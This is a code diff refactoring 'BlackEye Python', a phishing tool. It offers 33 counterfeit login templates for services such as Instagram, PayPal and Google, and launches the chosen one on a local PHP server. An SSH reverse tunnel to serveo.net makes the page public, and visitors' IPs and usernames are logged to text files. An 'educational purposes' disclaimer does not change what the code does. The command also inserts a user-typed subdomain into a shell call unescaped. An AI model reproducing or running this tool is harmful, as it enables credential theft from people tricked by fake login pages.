@@ -19,8 +19,9 @@ class colors:
     WHITEBG  = '\33[47m'
     END      = '\33[0m'
 
-try:
-    print(colors.RED + """
+def main():
+    try:
+        print(colors.RED + """
                         BlackEye Python
 
 Original Shell Program Created By thelinuxchoice
@@ -35,9 +36,9 @@ Differences:
 I nor the original developers take any responsibility for actions caused
 by using this program. Any misuse or damage caused by BlackEye is on the
 users behalf. Use for EDUCATIONAL PURPOSES!
-    """ + colors.END)
+        """ + colors.END)
 
-    print(colors.GREEN + """
+        print(colors.GREEN + """
                        Availble Templates
 
 [1] Instagram          [2] Facebook            [3] Snapchat
@@ -53,58 +54,61 @@ users behalf. Use for EDUCATIONAL PURPOSES!
 [31] Yandex            [32] devianART          [33] Custom
 
 Please Choose A Number To Host Template:
-    """ + colors.END)
-    templates = {
-    '1': 'instagram',
-    '2': 'facebook',
-    '3': 'snapchat',
-    '4': 'twitter',
-    '5': 'github',
-    '6': 'google',
-    '7': 'spotify',
-    '8': 'netflix',
-    '9': 'paypal',
-    '10': 'origin',
-    '11': 'steam',
-    '12': 'yahoo',
-    '13': 'linkedin',
-    '14': 'protonmail',
-    '15': 'wordpress',
-    '16': 'microsoft',
-    '17': 'igfollowers',
-    '18': 'ebay',
-    '19': 'pinterest',
-    '20': 'cryptocurrency',
-    '21': 'verizon',
-    '22': 'dropbox',
-    '23': 'adobeid',
-    '24': 'shopify',
-    '25': 'fbmessenger',
-    '26': 'gitlab',
-    '27': 'twitch',
-    '28': 'myspace',
-    '29': 'badoo',
-    '30': 'vk',
-    '31': 'yandex',
-    '32': 'devianart',
-    '33': 'create'
-    }
-    number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    if number == "18":
-        print("Ebay Currently Does Not Work. Choose Another..")
-        exit()
-    else:
+        """ + colors.END)
+        templates = {
+        '1': 'instagram',
+        '2': 'facebook',
+        '3': 'snapchat',
+        '4': 'twitter',
+        '5': 'github',
+        '6': 'google',
+        '7': 'spotify',
+        '8': 'netflix',
+        '9': 'paypal',
+        '10': 'origin',
+        '11': 'steam',
+        '12': 'yahoo',
+        '13': 'linkedin',
+        '14': 'protonmail',
+        '15': 'wordpress',
+        '16': 'microsoft',
+        '17': 'igfollowers',
+        '18': 'ebay',
+        '19': 'pinterest',
+        '20': 'cryptocurrency',
+        '21': 'verizon',
+        '22': 'dropbox',
+        '23': 'adobeid',
+        '24': 'shopify',
+        '25': 'fbmessenger',
+        '26': 'gitlab',
+        '27': 'twitch',
+        '28': 'myspace',
+        '29': 'badoo',
+        '30': 'vk',
+        '31': 'yandex',
+        '32': 'devianart',
+        '33': 'create'
+        }
+        number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
+        if number == "18":
+            print("Ebay Currently Does Not Work. Choose Another..")
+            sys.exit(0)
+        else:
+            pass
+        choice = templates[number]
+        print("Loading %s" % (choice))
+        print("\nEnter A Custom Subdomain")
+        subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
+        print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
+        print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
+        cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
+        p = subprocess.Popen(cmd_line, shell=True)
+        out = p.communicate()[0]
+
+
+    except KeyboardInterrupt:
         pass
-    choice = templates[number]
-    print("Loading %s" % (choice))
-    print("\nEnter A Custom Subdomain")
-    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
-    print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
-    p = subprocess.Popen(cmd_line, shell=True)
-    out = p.communicate()[0]
 
-
-except KeyboardInterrupt:
-    pass
+if __name__ == "__main__":
+    main()
